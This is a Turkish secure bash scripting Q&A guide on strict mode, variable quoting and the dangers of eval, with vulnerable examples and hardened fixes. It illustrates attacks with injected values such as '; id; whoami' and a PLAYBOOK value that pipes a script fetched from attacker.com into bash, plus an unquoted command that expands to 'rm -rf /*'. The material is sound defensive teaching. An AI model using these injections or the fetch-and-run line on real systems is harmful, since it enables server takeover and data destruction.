# G087: Bash Betik İskeleti ve Quoting Soru ve Cevap Rehberi

**ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR**  
*Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)*

---

### Soru 1: Bash Betiklerinde `set -euo pipefail` Katı Modunun ve `IFS` Yapılandırmasının Güvenlik Açısından Rolü Nedir?

#### 1. Soru Başlığı ve Tanımı
Bash betiklerinde varsayılan kabuk davranışının yarattığı güvenlik zafiyetleri (CWE-754) nelerdir ve `set -euo pipefail` ile `IFS=$'\n\t'` direktifleri betiğin yürütme güvenliğini nasıl garanti altına alır?

#### 2. Derinlemesine Teknik Analiz
Standart bir Bash kabuğu varsayılan olarak şu tehlikeli varsayımlarla çalışır:
1. **Hataları Görmezden Gelme (Silent Failure):** Bir komut çökse bile betik sonraki satırı çalıştırmaya devam eder.
2. **Tanımsız Değişkenleri Boşluk Sayma (Unset Variables to Empty):** `$UNDEFINED` değişkeni çağrıldığında hata fırlatmak yerine boş string (`""`) döner.
3. **Boru Hattı Maskelemesi (Pipeline Masking):** `cmd1 | cmd2` yapısında `cmd1` çökse bile `cmd2` başarılıysa `$?` 0 döner.
4. **Gevşek Kelime Bölünmesi (Default IFS):** Varsayılan `IFS=" \t\n"` nedeniyle boşluk içeren herhangi bir metin kabuk tarafından bağımsız argümanlara parçalanır.

`set -euo pipefail` direktifi bu tehlikeleri kökten çözer:
- **`-e` (errexit):** Herhangi bir komut 0 dışı dönerse betiği derhal sonlandırır.
- **`-u` (nounset):** Tanımlanmamış değişkene erişildiğinde `unbound variable` hatası vererek yürütmeyi durdurur.
- **`-o pipefail`:** Boru hattında en sağdaki komut yerine, başarısız olan en son komutun hata kodunu temel alır.
- **`IFS=$'\n\t'`:** Boşluk karakterini (` `) ayırıcı listesinden çıkararak dosya yollarının ve kullanıcı girdilerinin parçalanmasını önler.

#### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir yedekleme otomasyon betiği, eski yedek arşivlerini silmek üzere bir dizin parametresi alır:
```bash
BACKUP_DIR=$1
rm -rf $BACKUP_DIR/*
```
Betik argümansız çağrıldığında veya bir ortam değişkeni yüklenemediğinde `$BACKUP_DIR` boştur. Kabuk bunu `rm -rf /*` olarak yorumlar ve sunucunun tüm kök dosya sistemini siler.

**Pratik Çözüm (Usta Yaklaşımı):**
```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# Parametre zorunluluk kontrolü ve güvenli varsayılan
BACKUP_DIR="${1:?Hata: Yedekleme dizini parametresi zorunludur.}"

# Dizin varlığı ve göreli yol denetimi
if [[ ! -d "${BACKUP_DIR}" ]]; then
    echo "Hata: Belirtilen dizin mevcut değil: ${BACKUP_DIR}" >&2
    exit 1
fi

# Güvenli tırnak içinde ve mutlak yolla silme işlemi
rm -rf -- "${BACKUP_DIR:?}"/*
```

#### 4. Ustanın Çırağa Tavsiyesi
Çırak, yazdığın her Bash betiğinin ikinci satırına refleks olarak `set -euo pipefail` yazacaksın. Eğer bir komutun hata vermesine izin vermen gerekiyorsa, bunu katı kipi kapatarak değil; `komut || true` şeklinde açıkça belirterek yapacaksın.

---

### Soru 2: Değişken Genişletmelerinde Tırnak Kullanmamanın Yol Açtığı Word Splitting ve Globbing Zafiyetleri Nelerdir?

#### 1. Soru Başlığı ve Tanımı
Bash'te bir değişkeni `$VAR` yerine `"$VAR"` şeklinde çift tırnak içine almamak neden CWE-88 ve CWE-78 zafiyetlerine yol açar ve `"$@"` ile `$*` arasındaki fark nedir?

#### 2. Derinlemesine Teknik Analiz
Bash kabuğu bir komut satırını yürütmeden önce belirli aşamalardan geçirir:
1. **Parametre Genişletmesi (Parameter Expansion):** `$VAR` gerçek değerine dönüştürülür.
2. **Kelime Bölünmesi (Word Splitting):** Eğer değişken çift tırnak içinde DEĞİLSE, kabuk metni `IFS` karakterlerine göre ayırır ve ayrı argümanlar üretir.
3. **Yol Adı Genişletmesi (Pathname Expansion / Globbing):** Tırnaksız metinde `*`, `?`, `[` karakterleri varsa dosya sistemi taranarak eşleşen dosyalar parametre listesine enjekte edilir.

Örnek:
`FILE="rapor 2026.txt"` olsun.
- `cat $FILE` yürütüldüğünde kabuk bunu `cat rapor 2026.txt` olarak iki argümana böler: `cat` programı `rapor` ve `2026.txt` isimli iki ayrı dosya arar.
- Eğer dizinde `-rf` isimli bir dosya varsa ve `rm *` denirse, kabuk `-rf` dosyasını `rm` komutuna bir bayrak olarak sunar.

`"$@"` vs `$*`:
- `"$*"`: Tüm argümanları tek bir dizeye dönüştürür: `"arg1 arg2 arg3"`.
- `"${@}"`: Her argümanı kendi tırnakları içinde ayrı birer bağımsız varlık olarak korur: `"arg1"` `"arg 2"`. Fonksiyonlara argüman aktarırken bozulmayı önleyen tek güvenli yöntemdir.

#### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir log analiz betiği, kullanıcının girdiği dosya adlarını işlemek için döngü kullanmaktadır:
```bash
for file in $(ls /var/log/app); do
    cat $file | grep "ERROR"
done
```
Eğer `/var/log/app` altında `audit log.txt` gibi boşluklu bir dosya varsa döngü ikiye bölünür ve çöker. Eğer bir saldırgan `/var/log/app` altına `;touch /tmp/pwn;` veya `-rf` adında dosya koyarsa komut enjeksiyonu gerçekleşir.

**Pratik Çözüm (Usta Yaklaşımı):**
```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

LOG_DIR="/var/log/app"

# ls kullanmak yerine yerel kabuk globbingi ve çift tırnak disiplini
for file in "${LOG_DIR}"/*.log; do
    # Dosya varlığı kontrolü (eşleşme bulunamazsa koruma)
    [[ -e "${file}" ]] || continue

    # -- bayrağı ile parametre enjeksiyonunu engelleme
    grep -- "ERROR" "${file}" || true
done
```

#### 4. Ustanın Çırağa Tavsiyesi
Asla ama asla `$(ls)` üzerinde döngü kurma! `ls` bir insan gözü için tasarlanmıştır, betik döngüleri için değil. Değişken gördüğün her yere çift tırnak koy: `"$dosya"`, `"${hedef}"`, `"${@}"`. Tırnak, kabuğun zırhıdır.

---

### Soru 3: Bash'te `eval` Kullanımının Tehlikeleri Nelerdir ve Komut Enjeksiyonu (CWE-78) Nasıl Önlenir?

#### 1. Soru Başlığı ve Tanımı
Bash betiklerinde dinamik komut oluşturmak için `eval` kullanılması neden en tehlikeli güvenlik açığıdır ve güvenli alternatifleri nelerdir?

#### 2. Derinlemesine Teknik Analiz
`eval` komutunun işlevi, kendisine verilen dizgiyi kabuk ayrıştırıcısına (Shell Parser) **ikinci bir geçiş (second pass)** olarak yeniden göndermektir. Normalde bir değişken genişletildiğinde, kabuk onun içindeki özel karakterleri (`;`, `&&`, `|`, `` ` ``, `$()`) yeniden komut ayrıştırıcı olarak yorumlamaz. Ancak `eval` kullanıldığında:
```bash
COMMAND="ls $USER_INPUT"
eval $COMMAND
```
Eğer `$USER_INPUT` değeri `"; id; whoami"` ise, `eval` bu metni ikinci kez ayrıştırır ve noktalı virgülleri komut ayırıcı olarak yorumlayarak `id` ve `whoami` komutlarını sistemde çalıştırır.

#### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir CI/CD dağıtım betiği, ortam değişkenlerinden dinamik parametreler derleyip uzak sunucuya SSH üzerinden komut atmaktadır:
```bash
DEPLOY_CMD="ansible-playbook -i $INVENTORY $PLAYBOOK"
eval $DEPLOY_CMD
```
Saldırgan GitLab/GitHub PR açıklamasından veya ortam değişkeninden `PLAYBOOK` alanına `site.yml; curl http://attacker.com/rev.sh | bash` enjekte ettiğinde dağıtım sunucusu ele geçirilir.

**Pratik Çözüm (Usta Yaklaşımı):**
Dinamik komutlar için `eval` yerine **Bash Dizileri (Arrays)** ve güvenli indeksleme kullanılır:
```bash
#!/usr/bin/env bash
set -euo pipefail

# Komut ve parametreler dizi elemanı olarak tanımlanır
declare -a CMD_ARGS=(
    "ansible-playbook"
    "-i" "${INVENTORY}"
    "--limit" "${TARGET_GROUP}"
    "${PLAYBOOK}"
)

# eval yerine doğrudan dizi genişletmesi ile güvenli çalıştırma
"${CMD_ARGS[@]}"
```
Dizi elemanları `"${CMD_ARGS[@]}"` şeklinde çağrıldığında, kabuk her elemanı ayrık bir argüman olarak iletir. İçerideki noktalı virgül veya boru karakteri asla kabuk komutuna dönüşemez.

#### 4. Ustanın Çırağa Tavsiyesi
Evlat, aklına `eval` yazmak geldiği an klavyeyi bırak ve derin bir nefes al. Kendine şu soruyu sor: "Ben şu an sistemimin anahtarlarını saldırgana mı veriyorum?" `eval` yerine her zaman Bash dizilerini (`declare -a`) ve fonksiyonları kullan. Güvenli kod, tembel kodun panzehiridir.
